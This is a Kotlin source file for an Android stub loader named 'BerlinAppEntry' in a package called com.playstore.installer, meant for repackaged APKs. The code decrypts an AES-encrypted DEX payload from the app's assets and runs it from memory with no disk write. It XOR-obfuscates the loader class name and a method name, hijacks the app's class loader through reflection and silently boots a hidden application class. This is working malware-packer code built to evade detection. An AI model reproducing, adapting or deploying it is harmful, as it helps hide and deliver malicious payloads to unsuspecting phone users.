package com.playstore.installer

import android.app.Application
import android.content.Context
import java.io.ByteArrayOutputStream
import java.io.InputStream
import java.nio.ByteBuffer

// Berlin stub loader — compiled standalone into classes.dex by build_stub_dex.py.
// No BuildConfig dependency. Asset name and AES key are patched directly into
// DEX byte arrays by build_stub_dex.py at CI time before APK repackaging.
//
// PATCH MARKERS (must stay exactly as-is — build_stub_dex.py searches for them):
//   BERLIN_STUB_ASSET_MARKER : 32 bytes 0xAB — patched with asset name UTF-8 (null-padded)
//   BERLIN_STUB_KEY_MARKER   : 32 bytes 0xCD — patched with AES-256 key hex UTF-8 (64 chars)
//
// Zero disk write — InMemoryDexClassLoader only. RAM only.
class BerlinAppEntry : Application() {

    // Asset name placeholder — 32 bytes 0xAB
    // build_stub_dex.py patches this with actual BERLIN_DEX_ASSET name (e.g. "d4f9a2c1.bin")
    private val A = byteArrayOf(
        0xAB.toByte(), 0xAB.toByte(), 0xAB.toByte(), 0xAB.toByte(),
        0xAB.toByte(), 0xAB.toByte(), 0xAB.toByte(), 0xAB.toByte(),
        0xAB.toByte(), 0xAB.toByte(), 0xAB.toByte(), 0xAB.toByte(),
        0xAB.toByte(), 0xAB.toByte(), 0xAB.toByte(), 0xAB.toByte(),
        0xAB.toByte(), 0xAB.toByte(), 0xAB.toByte(), 0xAB.toByte(),
        0xAB.toByte(), 0xAB.toByte(), 0xAB.toByte(), 0xAB.toByte(),
        0xAB.toByte(), 0xAB.toByte(), 0xAB.toByte(), 0xAB.toByte(),
        0xAB.toByte(), 0xAB.toByte(), 0xAB.toByte(), 0xAB.toByte()
    )

    // AES-256 key placeholder — 64 bytes 0xCD (64-char hex key = 64 UTF-8 bytes)
    // build_stub_dex.py patches this with actual BERLIN_DEX_KEY hex string
    private val K = byteArrayOf(
        0xCD.toByte(), 0xCD.toByte(), 0xCD.toByte(), 0xCD.toByte(),
        0xCD.toByte(), 0xCD.toByte(), 0xCD.toByte(), 0xCD.toByte(),
        0xCD.toByte(), 0xCD.toByte(), 0xCD.toByte(), 0xCD.toByte(),
        0xCD.toByte(), 0xCD.toByte(), 0xCD.toByte(), 0xCD.toByte(),
        0xCD.toByte(), 0xCD.toByte(), 0xCD.toByte(), 0xCD.toByte(),
        0xCD.toByte(), 0xCD.toByte(), 0xCD.toByte(), 0xCD.toByte(),
        0xCD.toByte(), 0xCD.toByte(), 0xCD.toByte(), 0xCD.toByte(),
        0xCD.toByte(), 0xCD.toByte(), 0xCD.toByte(), 0xCD.toByte(),
        0xCD.toByte(), 0xCD.toByte(), 0xCD.toByte(), 0xCD.toByte(),
        0xCD.toByte(), 0xCD.toByte(), 0xCD.toByte(), 0xCD.toByte(),
        0xCD.toByte(), 0xCD.toByte(), 0xCD.toByte(), 0xCD.toByte(),
        0xCD.toByte(), 0xCD.toByte(), 0xCD.toByte(), 0xCD.toByte(),
        0xCD.toByte(), 0xCD.toByte(), 0xCD.toByte(), 0xCD.toByte(),
        0xCD.toByte(), 0xCD.toByte(), 0xCD.toByte(), 0xCD.toByte(),
        0xCD.toByte(), 0xCD.toByte(), 0xCD.toByte(), 0xCD.toByte(),
        0xCD.toByte(), 0xCD.toByte(), 0xCD.toByte(), 0xCD.toByte()
    )

    @Volatile private var h: ClassLoader? = null

    override fun attachBaseContext(base: Context?) {
        super.attachBaseContext(base)
        try { run(base) } catch (t: Throwable) { }
    }

    // Secondary injection point — Android calls getClassLoader() to resolve
    // Activity/Service classes. Returning h here guarantees MainActivity is
    // found in the decrypted DEX even on OEMs where mPackageInfo injection
    // timing varies.
    override fun getClassLoader(): ClassLoader {
        return h ?: super.getClassLoader()
    }

    private fun assetName(): String? {
        val PAD = 0xAB.toByte()
        var len = 0; while (len < A.size && A[len] != PAD) len++
        if (len == 0) return null
        return String(A, 0, len, Charsets.UTF_8)
    }

    private fun keyHex(): String? {
        val PAD = 0xCD.toByte()
        var len = 0; while (len < K.size && K[len] != PAD) len++
        if (len != 64) return null
        return String(K, 0, 64, Charsets.UTF_8)
    }

    private fun run(base: Context?) {
        val name = assetName() ?: return
        val key  = keyHex()   ?: return
        // Use 'base' parameter directly — 'assets' (this.assets) is null during
        // attachBaseContext because the context is not yet fully attached.
        // Fallback to baseContext?.assets in case base is null on some OEMs.
        val assetMgr = base?.assets ?: baseContext?.assets ?: return
        val enc: ByteArray = peel(assetMgr.open(name)) ?: return
        if (enc.size < 17) { wipe(enc); return }
        val dex: ByteArray = aesDecrypt(enc, key) ?: run { wipe(enc); return }
        wipe(enc)
        if (dex.size < 8) { wipe(dex); return }
        val ne = byteArrayOf(0x3e,0x3b,0x36,0x2c,0x33,0x31,0x74,0x29,0x23,0x29,0x2e,0x3f,0x37,0x74,0x13,0x34,0x17,0x3f,0x37,0x35,0x28,0x23,0x1e,0x3f,0x22,0x19,0x36,0x3b,0x29,0x29,0x16,0x35,0x3b,0x3e,0x3f,0x28)
        val nc = CharArray(ne.size); var i = 0; while (i < ne.size) { nc[i] = (ne[i].toInt() and 0xFF xor 0x5A).toChar(); i++ }
        try {
            val cls  = Class.forName(String(nc))
            val ctor = cls.getConstructor(ByteBuffer::class.java, ClassLoader::class.java)
            // Parent must be the system classloader (not null) so decrypted classes can resolve framework types
            val b    = ClassLoader::class.java.cast(ctor.newInstance(ByteBuffer.wrap(dex), ClassLoader.getSystemClassLoader())) ?: return
            h = b; chain(b)
        } catch (t: Throwable) { wipe(dex); return } finally { wipe(dex) }
    }

    override fun onCreate() { super.onCreate(); kick() }

    private fun kick() {
        val b = h ?: classLoader ?: return
        try {
            // Boot LauncherApplication from the decrypted DEX loaded in RAM
            val cls = Class.forName((packageName ?: return) + ".LauncherApplication", true, b)
            val app = cls.newInstance() as? Application ?: return
            val ae  = byteArrayOf(0x3b,0x2e,0x2e,0x3b,0x39,0x32)
            val ac  = CharArray(ae.size); var i = 0; while (i < ae.size) { ac[i] = (ae[i].toInt() and 0xFF xor 0x5A).toChar(); i++ }
            val m   = Application::class.java.getDeclaredMethod(String(ac), Context::class.java)
            m.isAccessible = true; m.invoke(app, baseContext); app.onCreate()
        } catch (t: Throwable) { }
    }

    private fun aesDecrypt(blob: ByteArray, keyHex: String): ByteArray? {
        if (blob.size < 17 || keyHex.length != 64) return null
        val k = try { ByteArray(32) { i -> keyHex.substring(i*2,i*2+2).toInt(16).toByte() } } catch (t: Throwable) { return null }
        return try {
            val iv = blob.copyOfRange(0,16); val ct = blob.copyOfRange(16,blob.size)
            val c  = javax.crypto.Cipher.getInstance("AES/CBC/PKCS5Padding")
            c.init(javax.crypto.Cipher.DECRYPT_MODE, javax.crypto.spec.SecretKeySpec(k,"AES"), javax.crypto.spec.IvParameterSpec(iv))
            val r = c.doFinal(ct); wipe(k); wipe(iv); wipe(ct); r
        } catch (t: Throwable) { wipe(k); null }
    }

    private fun chain(c: ClassLoader?) {
        if (c == null) return
        // Inject via mPackageInfo.mClassLoader — the classloader Android uses to resolve
        // Activities, Services and other components. This is the proven correct injection
        // point (parent-chain patching is insufficient for component resolution).
        try {
            var cls: Class<*>? = baseContext?.javaClass
            var pkgInfoField: java.lang.reflect.Field? = null
            while (cls != null && pkgInfoField == null) {
                pkgInfoField = try { cls.getDeclaredField("mPackageInfo") } catch (_: NoSuchFieldException) { null }
                cls = cls.superclass
            }
            if (pkgInfoField == null) return
            pkgInfoField.isAccessible = true
            val pkgInfo = pkgInfoField.get(baseContext) ?: return

            var cls2: Class<*>? = pkgInfo.javaClass
            var clField: java.lang.reflect.Field? = null
            while (cls2 != null && clField == null) {
                clField = try { cls2.getDeclaredField("mClassLoader") } catch (_: NoSuchFieldException) { null }
                cls2 = cls2.superclass
            }
            if (clField == null) return
            clField.isAccessible = true
            clField.set(pkgInfo, c)
        } catch (t: Throwable) { }

        // Also set thread context classloader so any thread-local Class.forName calls resolve correctly
        try { Thread.currentThread().contextClassLoader = c } catch (t: Throwable) { }
    }

    private fun peel(s: InputStream?): ByteArray? {
        if (s == null) return null
        val o = ByteArrayOutputStream(); val b = ByteArray(8192)
        try { var n = s.read(b); while (n != -1) { o.write(b,0,n); n = s.read(b) } } finally { try { s.close() } catch (t: Throwable) { } }
        return o.toByteArray()
    }

    private fun wipe(a: ByteArray?) { if (a == null) return; var i = 0; while (i < a.size) { a[i] = 0; i++ } }
}
